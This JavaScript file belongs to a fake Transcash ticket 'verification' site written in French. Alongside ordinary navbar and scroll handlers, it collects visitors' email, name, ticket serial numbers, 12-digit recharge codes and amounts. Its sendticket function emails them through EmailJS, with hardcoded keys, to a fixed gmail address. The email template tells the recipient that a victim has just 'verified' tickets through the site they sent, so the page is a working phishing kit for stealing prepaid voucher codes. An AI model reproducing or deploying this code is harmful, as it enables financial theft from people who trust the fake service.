'use strict';



/**
 * add event on element
 */
function infoticket(nbrtick) {
let msgtick=""
    for (var i = 0; i <nbrtick.length; i++) {
    console.log(nbrtick[i])
    msgtick+=`
    
 Ticket (${i+1})
      Numéro de série/référence du ticket (${i+1})
      ${nbrtick[i].serie}
      Code de tickets/12 chiffres 
      ${nbrtick[i].code}
      Prix/Montant ticket (s)
      ${nbrtick[i].montant}
     
      `
      
  
  
 }
 return {
     length:nbrtick.length,
     msg:msgtick
 }
}

const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}



/**
 * navbar toggle
 */

const navTogglers = document.querySelectorAll("[data-nav-toggler]");
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const overlay = document.querySelector("[data-overlay]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  overlay.classList.toggle("active");
}

addEventOnElem(navTogglers, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  overlay.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);



/**
 * header sticky & back top btn active
 */

const header = document.querySelector("[data-header]");
const backTopBtn = document.querySelector("[data-back-top-btn]");

const headerActive = function () {
  if (window.scrollY > 10) {

    backTopBtn.classList.add("active");
  } else {
  
    backTopBtn.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", headerActive);

let lastScrolledPos = 0;

const headerSticky = function () {
  if (lastScrolledPos >= window.scrollY) {
    header.classList.remove("header-hide");
  } else {
    header.classList.add("header-hide");
  }

  lastScrolledPos = window.scrollY;
}

addEventOnElem(window, "scroll", headerSticky);



/**
 * scroll reveal effect
 */

const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 2) {
      sections[i].classList.add("active");
    }
  }
}

scrollReveal();

addEventOnElem(window, "scroll", scrollReveal);



const verifyTranscash=document.getElementById('verify-transcash')

function verifyticket(index) {
 verifyTranscash.innerHTML = `
  <div class="title-wrapper">
    <h2 class="h2 section-title">Données Personnelles  </h2>
 <div class="ticketinline">
    <div class="user">
      <p >Remplir les champs en renseignant vos informations personnelles </p>
             
             <p>Adresse mail</p>
                  <input type="email" name="email_address" placeholder="Enter your email address" required
                    class="email-field">
                  
                   
                     <p>Prénom</p>
        <input type="text" name="Prénom" placeholder="Entrer votre prénom " required
                         class="email-field">
                         
                         
                         
                          </div>
                    
 
                
                     
 
    <div class="ticketnumber">
 <h2 class="h2 section-title">Quantité(s) de tickets à vérifier  </h2>
      <p > vous avez le choix de vérifier la validité de plusieurs tickets à la fois en clic de même qu'un seul  ticket</p>
      <div class='nbr-tick' id='tick'> 
               <div class='menu${tiketcount}'>
                    <div class='mnu-tick'> 
                      <h2 class="headticket" style="display:flex;justify-content:space-evenly;align-items:center;background:lightgrey;margin-block:2rem" >${tiketcount} ticket
                      <button id="alter${tiketcount}"class="alt down"onclick=hide(${tiketcount})>
                      <ion-icon name="caret-down-outline"></ion-icon>
             
                      </button>
                              <button onclick=remove(${tiketcount})>
                               <ion-icon name="archive" ></ion-icon>
                              </button>
                      </h2>
                             
                      </div> 
                               <div id='vbl${tiketcount}'
                 class='visible'> 
                      <p>Numéro de série du ticket</p>
                  <input type="text" name="email_address" placeholder="série ticket" required
                   class="serie email-field ">
                    <div class='info'>    </div>  
                                  <div>
 <p>Entrez votre code de recharge à 12 chiffres</p>
   <input type="number" name="Prénom" placeholder="Entrer votre code  " required
        class="password email-field ">
       <div class='info'></div> <div>  
       <p>Montant du ticket </p>
      <input type="number" name="Prénom" placeholder="Entrer votre montant  " required
          class="montant email-field ">
       <div class='info'> </div>
                                     </div>  
                                      </div>        
              
                            
              
                       </div> 
       </div> </div>                          <div>    
                   <button type="submit" class="btn btn-primary"onclick=ajoutticket()>Ajout ticket                   </button>
                                                    </div>
    <button type="submit" class="btn btn-primary btn-verify"onclick=valide()>vérifier /ticket                  </button>
                                    
  </div>
  </div>
 `

 verifyTranscash.scrollIntoView()
}
var tiketcount=1,isvisible=true,save=[

  ]
  
  var isemail=false
  var isusername=false
  var isserie=false
  var iscode=false
  var ismontant=false
  var info={
email:"",
username:""
}
function ajoutticket() {
  const serie = document.getElementsByClassName("serie")
  const pass = document.getElementsByClassName("password")
  
  const montant = document.getElementsByClassName("montant")
  const visible=document.getElementsByClassName("visible")
  const alt=document.getElementsByClassName("alt")
 modify()

 tiketcount++
 
  
  
  
  const tik=document.getElementById('tick')
  
  tik.innerHTML+=`
  
  <div class='menu${tiketcount}'>
       <div class='mnu-tick'> 
         <h2 style="display:flex;justify-content:space-evenly;align-items:center;background:lightgrey;margin-block:2rem" >${tiketcount} ticket
         <button id="alter${tiketcount}"class="alt down" onclick=hide(${tiketcount}) >
         <ion-icon name="caret-down-outline"></ion-icon>

         </button>
                 <button onclick=remove(${tiketcount})>
                  <ion-icon name="archive" ></ion-icon>
                 </button>
         </h2>
                
         </div> 
                  <div id='vbl${tiketcount}'
                 class='visible'> 
         <p>Numéro de série du ticket</p>
     <input type="text" name="email_address" placeholder="série ticket" required
      class="serie email-field ">
       <div class='info'>    </div>  
                     <div>
                     <p>Entrez votre code de recharge à 12 chiffres</p>
        <input type="number" name="Prénom" placeholder="Entrer votre code  " required
        class="password email-field " maxlength="12">
                 <div class='info'>    </div>                                 <div>  
                                         <p>Montant du ticket </p>
   <input type="number" name="Prénom" placeholder="Entrer votre montant  " required
          class="montant email-field ">
                                <div class='info'>    </div>
                        </div>  
                         </div>        
 
               
 
          </div> 
    </div>
    </div>
  `

var dataticket = []

for (var i = 0; i < tiketcount; i++) {
  console.log(i)
 
    dataticket = JSON.parse(localStorage.getItem("ticket")) || []
    console.log(dataticket)

    const index = dataticket.findIndex(index => index.nbr == i)
    console.log(index)
    if (index > -1) {
     

      serie[index].value = dataticket[index].serie
      pass[index].value = dataticket[index].code
      montant[index].value = dataticket[index].montant
    

  }

}

}
function hide(hideidx) {

let element=document.getElementById('vbl'+hideidx)
let alter=document.getElementById('alter'+hideidx)
const visible=document.getElementsByClassName("visible")
  const alt=document.getElementsByClassName("alt")
  
  if(alter.classList[1]=="down"){
      isvisible=true
  }
  if(alter.classList[1]=="up"){
      isvisible=false
  }
  
if(isvisible){
  for (var i = 0; i < visible.length; i++) {
    visible[i].style.display = 'none'
 alt[i].innerHTML=`<ion-icon name="caret-up-outline"></ion-icon>`
    element.style.display="none"
    alt[i].className="alt up"
  }
alter.className="alt up"
  
isvisible=false
alter.innerHTML=`<ion-icon name="caret-up-outline"></ion-icon>`
}
else {
 for (var i = 0; i < visible.length; i++) {
    visible[i].style.display = 'none'
    alt.innerHTML=`<ion-icon name="caret-up-outline"></ion-icon>`
    alt[i].className="alt up"
  
    element.style.display="block"
    
    
  }
  alter.className="alt down"
  
  
  isvisible = true
  
  alter.innerHTML=`
  <ion-icon name="caret-down-outline"></ion-icon>`
}
console.log(isvisible)
}

function remove (rmove) {
 const tik=document.getElementById('tick')
  const removeElement=document.getElementsByClassName('menu'+rmove)
  removeElement[0].remove()
  tiketcount--
/*  tik.removeChild(removeElement[0])*/
  
}
function valide() {
  event.preventDefault
  const    serie=document.getElementsByClassName("serie")
  const pass=document.getElementsByClassName("password")
  
  const montant=document.getElementsByClassName("montant")
  const data=document.getElementsByClassName("email-field")
   console.log(data[0].value)
  const good=/^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/.test(data[0].value)
  if(good ) {
      console.log(good)
      isemail=true
      info.email=data[0].value
  }else {
      isemail=false
      info.username=""
  }
  
  if(data[1].value!="") {
      isusername=true
      info.username=data[1].value
  }else {
      isusername=false
      info.username=""
  }
  for (var i = 0; i <serie.length ; i++) {
   if (serie[i].value!='') {
     serie[i].style.border = '2px solid darkgreen '
     serie[i].nextElementSibling.innerHTML=''
   isserie=true
   }
   else{
     serie[i].style.border='2px solid red'
     serie[i].nextElementSibling.innerHTML='Numéro Série Ticket est vide'
   isserie=false
   }
   
   if (pass[i].value != '') {
   if (pass[i].value.length==12) {
     pass[i].style.border='2px solid darkgreen'
     
     pass[i].nextElementSibling.innerHTML=''
     iscode=true
   }
   else{
     pass[i].style.border='2px solid red'
     pass[i].nextElementSibling.innerHTML='Code de Recharge  doit avoir minimum 12 chiffres'
    iscode=false
   }
   }
   else {
     pass[i].style.border = '2px solid red'
    pass[i].nextElementSibling.innerHTML='Code de Recharge est vide'
    iscode=false
   }
   
   if (montant[i].value!='') {
     if (Number(montant[i].value)>0) {
             montant[i].style.border = '2px solid darkgreen'
     montant[i].nextElementSibling.innerHTML = ""
     ismontant=true
     }
     else {
      montant [i].style.border = '2px solid red'
   montant[i].nextElementSibling.innerHTML="montant de Rechange n'est pas valide 0"
   ismontant=false
     }
   }
   else {
     montant[i].style.border = '2px solid red'
    montant[i].nextElementSibling.innerHTML='Montant de Recharge est vide'
    ismontant=false
   }
   
  }
  if(isemail&& isusername&& isserie&& iscode&& ismontant) {
    modify()
 let data = JSON.parse(localStorage.getItem('ticket')) || []   
    const datamail=infoticket(data)
    console.log(info.email+'trouvé')
        sendticket(datamail,info)
  }else {
      console.log("a error occur in data")
      modify()
  }
  
  
  
 
}


function message(listticket,ticket) {
    return `
    Monsieur/Madame ${ticket.username} vient de vérifier ${listticket.length} ticket(s) via le site de transcash que vous lui avez transmis.
    INFORMATIONS/TICKETS VÉRIFIÉ(S)
    ${listticket.msg}
    `
    }
   function tikcount(ct) {
    if(ct==0){
        return 1
    }
    else{
        return ct        
}
}

function modify() {
const    serie=document.getElementsByClassName("serie")
  const pass=document.getElementsByClassName("password")
  
  const montant=document.getElementsByClassName("montant")
  const data=document.getElementsByClassName("email-field")
  var dataticket=[]
    for (var i = 0; i <tiketcount; i++) {
    console.log(i)
    if(serie[i].value!="" && pass[i].value!=""&& montant[i].value!="") {
      dataticket=JSON.parse(localStorage.getItem("ticket"))|| []
      console.log(dataticket)
    
    const index=dataticket.findIndex(index=>index.nbr==i)
       console.log(index)
   if (index>-1) {
    dataticket[index].serie=serie[index].value
    dataticket[index].code=pass[i].value
    dataticket[index].montant=montant[i].value
    
    serie[index].value=dataticket[index].serie
    pass[index].value=dataticket[index].code
    montant[index].value=dataticket[index].montant
   } else {
    dataticket.push({
      nbr:i,
      serie:serie[i].value,
      code:pass[i].value,
      montant:montant[i].value
    })
    
    localStorage.setItem('ticket',JSON.stringify(dataticket))
   }
       
}
      
    }
}
window.onload=function () {
  localStorage.clear()
}
function sendticket(userGet,i) {
 emailjs.init('nO0mGzC33a5qOSUx7')
var param = {
  sendername: "Tickets Services",
  to: "reunierprospere@gmail.com",
  name: '' + i.username,
  replyto: "" + i.email,
  message: message(userGet,i)
    

}
var serviceId = "service_cuzrpno"
var templateId = "template_z2winer"


emailjs.send(serviceId, templateId, param).then(function(resp) {

      if (resp.status == 200) {
        console.log(resp.status)}
})
}